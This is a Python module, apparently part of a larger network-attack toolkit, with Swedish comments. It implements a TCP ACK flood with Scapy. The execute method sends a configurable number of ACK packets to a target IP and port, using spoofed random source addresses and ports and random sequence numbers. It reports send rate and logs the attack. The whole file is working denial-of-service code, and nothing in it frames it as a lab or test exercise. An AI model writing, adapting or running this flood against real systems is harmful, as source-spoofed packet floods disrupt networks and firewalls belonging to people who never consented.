"""
ACK Flood Attack
Skickar TCP ACK-paket utan etablerad connection
"""
from scapy.all import IP, TCP, Raw
import time
import random
from .base_attack import BaseAttack
from utils.network_utils import generate_random_ip, generate_random_port


class ACKFloodAttack(BaseAttack):
    """ACK Flood - TCP ACK-paket utan connection"""

    def get_attack_name(self):
        return "ACK Flood"

    def execute(self, count=100, target_port=80):
        """Kör ACK flood attack"""
        self.print_header("ACK Flood Attack", port=target_port, count=count)

        print("[*] ACK Flood tvingar servern att söka efter icke-existerande connections")
        print("[*] Belastar stateful firewalls och connection-tracking")

        self.start_time = time.time()
        self.packets_sent = 0

        for i in range(count):
            fake_source = generate_random_ip()
            fake_sport = generate_random_port()

            # TCP ACK-paket med random sequence numbers
            payload = f"{self.custom_message}_ACK_PKT_{i + 1}".encode()

            packet = IP(src=fake_source, dst=self.target_ip) / \
                     TCP(sport=fake_sport, dport=target_port,
                         flags="A",  # ACK flag
                         seq=random.randint(1000000, 9000000),
                         ack=random.randint(1000000, 9000000)) / \
                     Raw(load=payload)

            self.send_packet(packet)

            if (i + 1) % 50 == 0:
                elapsed = time.time() - self.start_time
                pps = self.packets_sent / elapsed if elapsed > 0 else 0
                print(f"[+] ACK: {i + 1}/{count} paket skickade ({pps:.1f} pps)")

        self.log_attack("ACK_FLOOD",
                        f"Port {target_port}, {count} ACK packets, message: {self.custom_message}")
        self.print_summary()

